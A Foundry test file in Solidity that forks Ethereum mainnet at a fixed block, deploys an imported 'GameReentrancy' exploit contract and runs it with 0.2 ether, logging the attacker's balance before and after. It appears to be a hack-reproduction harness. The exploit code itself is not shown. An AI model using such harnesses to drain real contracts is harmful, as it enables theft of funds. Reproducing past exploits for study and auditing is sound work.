pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {GameReentrancy} from "../src/GameReentrancy.sol";


contract GameReentrancyTest is Test {
    GameReentrancy exploit;
    address bob;
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl('mainnet'), 19213836);
        bob = makeAddr("bob");
        vm.deal(bob, 1 ether);
        vm.prank(bob);
        exploit = new GameReentrancy();

    }
    function test_Reentrancy() public {
        vm.prank(bob);
        console2.log("ETH balance before: ", bob.balance);
        exploit.start{value: 0.2 ether}();
        console2.log("ETH balance after: ", bob.balance);
    }
}